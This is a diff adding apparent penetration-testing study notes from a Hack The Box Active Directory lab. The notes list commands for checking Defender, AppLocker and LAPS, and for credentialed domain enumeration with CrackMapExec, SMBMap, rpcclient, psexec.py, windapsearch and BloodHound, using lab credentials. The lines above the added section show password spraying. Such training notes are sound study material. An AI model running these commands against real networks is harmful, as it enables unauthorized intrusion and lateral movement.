@@ -92,3 +92,84 @@ PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success 
 xfreerdp3 /v:10.129.233.239 /u:htb-student /p:HTB_@AAcademy_stdnt_AD!
 
 ssh htb-student@10.129.233.238
+
+
+##### Windows Defender
+
+PS> Get-MpComputerStatus
+
+PS> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+###### PowerShell Constrained Language Mode
+
+
+$ExecutionContext.SessionState.LanguageMode
+
+
+###### LAPS
+
+PS> Find-LAPSDelegatedGroups
+
+PS> Find-AdmPwdExtendedRights
+
+PS> Get-LAPSComputers
+
+
+##### Credentialed Enumeration - from Linux
+
+###### CrackMapExec
+
+
+crackmapexec -h
+
+crackmapexec smb -h
+
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+
+sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
+
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+
+
+###### SMBMap
+
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+
+###### rpcclient
+
+rpcclient -U "" -N 172.16.5.5
+
+rpcclient $> queryuser 0x457
+
+rpcclient $> enumdomusers
+
+
+###### Impacket Toolkit
+
+psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
+
+
+###### Windapsearch
+
+windapsearch.py -h
+
+  python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+
+###### Bloodhound.py
+
+bloodhound-python -h
+
+sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
+
+zip -r ilfreight_bh.zip *.json
+
+ sudo neo4j start
+
